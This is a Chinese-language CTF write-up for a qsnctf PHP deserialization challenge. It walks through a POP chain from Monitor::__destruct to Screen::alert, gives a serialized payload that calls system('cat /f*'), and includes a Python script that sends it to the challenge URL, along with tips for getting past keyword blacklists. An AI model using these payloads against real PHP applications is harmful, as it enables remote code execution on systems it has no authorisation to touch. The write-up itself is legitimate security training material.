# WP · [qsnctf] 目录浏览器监控 —— 反序列化 POP 链 + 变量函数调用 RCE（get flag）

> 分类：09-PHP反序列化 ｜ 栈：nginx + PHP/5.6.40 ｜ 难度：入门级 POP 链，练「变量函数调用」落点
> 题目：`http://challenge.qsnctf.com:40785/`
> **Flag：`flag{6a831b321e5b4ca88059a885bae58b50}`**

---

## 0. 一句话思路

首页 `highlight_file` 直接暴露源码 → 入口 `unserialize($_GET['code'])`（只拦 `flag` 关键字）→
构造 **`Monitor`(status="danger")**，其 `__destruct` 自动调用 `reporter->alert()`；
把 `reporter` 指向 **`Screen`** 对象，`Screen::alert()` 里 `$format($content)` 是**变量函数调用**，
`format="system"`、`content="cat /f*"` → 直接执行命令读根目录 flag。

---

## 1. 定性：PHP 反序列化题

- 响应头 `X-Powered-By: PHP/5.6.40` → PHP 题。
- 首页源码高亮可见（`highlight_file(__FILE__)`），核心入口：
  ```php
  if (isset($_GET['code'])) {
      $input = $_GET['code'];
      if (preg_match('/flag/i', $input)) { die("No flag here!"); }
      unserialize($input);          // ← 反序列化入口
  }
  ```
- 看到「用户输入 → `unserialize()`」= 反序列化题；再看代码里有没有**危险的魔法方法/函数调用**当落点。

## 2. 找落点与触发点

| 类 | 关键代码 | 作用 |
|---|---|---|
| `Monitor` | `__destruct()`：`status==="danger"` 时 `$this->reporter->alert()` | **触发点**：对象销毁时自动执行 |
| `Logger` | `alert()`：echo "System normal..." | 正常情况（无利用价值） |
| `Screen` | `alert()`：`$func=$this->format; return $func($this->content);` | **落点**：`format` 值当函数名调用 = 任意函数执行 |

> `Screen::alert()` 里 `$func($this->content)` 是 **PHP 变量函数**：如果 `$func="system"`，
> 就等价于 `system($this->content)`，且 `system()` 会把命令输出**直接打印到页面**（不用 echo 返回值）。

## 3. 组装 POP 链

```
Monitor(status="danger", reporter=Screen(format="system", content="cat /f*"))
   ↓ unserialize 后脚本结束，Monitor 对象销毁 → __destruct 自动触发
   ↓ status=="danger" 成立
   ↓ reporter->alert() → 调用 Screen::alert()
   ↓ $format="system" → system("cat /f*")
   ↓ 打印 /flag 内容
```

> 命令为什么用 `cat /f*` 不用 `cat /flag`：`preg_match('/flag/i', $input)` 检查**整个序列化字符串**，
> `cat /f*` 里没有连续 `flag` 字样 → 通配符避开黑名单（与 40559 同款避嫌手法）。

## 4. 构造序列化串（private 属性要带 \x00）

`Monitor::$status` / `$reporter` 是 **private**，序列化键名格式为 `\0类名\0属性名`（两个空字节），
长度必须精确数对（空字节算 1 个字符）：

```
O:7:"Monitor":2:{
  s:15:"\0Monitor\0status";   s:6:"danger";
  s:17:"\0Monitor\0reporter"; O:6:"Screen":2:{
    s:7:"content";  s:7:"cat /f*";
    s:6:"format";   s:6:"system";
  }
}
```

- `s:15` = `\0`(1) + `Monitor`(7) + `\0`(1) + `status`(6) = 15 ✅
- `s:17` = `\0`(1) + `Monitor`(7) + `\0`(1) + `reporter`(8) = 17 ✅
- `Screen` 的 `content`/`format` 是 public，键名不带空字节。

GET 传参时空字节要 URL 编码成 `%00`。

### 提交脚本（复现用）
```python
import urllib.request, urllib.parse

payload = 'O:7:"Monitor":2:{s:15:"\x00Monitor\x00status";s:6:"danger";' \
          's:17:"\x00Monitor\x00reporter";O:6:"Screen":2:{' \
          's:7:"content";s:7:"cat /f*";s:6:"format";s:6:"system";}}'
assert 'flag' not in payload.lower()          # 黑名单自检

url = 'http://challenge.qsnctf.com:40785/?code=' + urllib.parse.quote(payload, safe='')
with urllib.request.urlopen(url, timeout=15) as r:
    print(r.read().decode('utf-8', 'replace'))
```

输出即为 flag：`flag{6a831b321e5b4ca88059a885bae58b50}`

---

## 5. 这题该记住的（通用套路）

1. **看到 `unserialize(用户输入)` → 反序列化题**，去源码里找魔法方法（`__destruct`/`__toString`/`__wakeup`）当触发点。
2. **变量函数调用是常见 RCE 落点**：`$func($arg)`、`call_user_func`、`array_map` 等都可能导致任意函数执行，`format` 可控就设成 `system`/`eval`。
3. **POP 链三步**：找落点（危险函数）→ 找触发点（魔法方法）→ 从触发点反推需要哪些对象/属性。
4. **private/protected 属性的序列化格式**：private 是 `\0类名\0属性`（URL 编码 `%00`），protected 是 `\0*\0属性`；长度数错反序列化直接失败。
5. **黑名单只查输入字符串**：命令里避开 `flag` 用通配符 `cat /f*`、`cat /fl*`。
6. **PHP 5.x 序列化细节**：`__construct` 在反序列化时**不会**调用，`__destruct` 在对象销毁时**会**调用——所以构造器里 new 的 Logger 不影响我们覆盖的属性。

## 6. 同类题位置

- 同分类：`WP-[qsnctf]反序列化绕过黑名单.md`（40507，入门）、`WP-[qsnctf]反序列化POP链-eval代码执行.md`（40515，__toString→eval）
- 笔记：`Web笔记12-PHP序列化与反序列化.md`、`Web笔记14-PHP反序列化进阶POP链与魔法方法.md`
- 工具：`serforge.py`（可生成带 private 属性的序列化串）
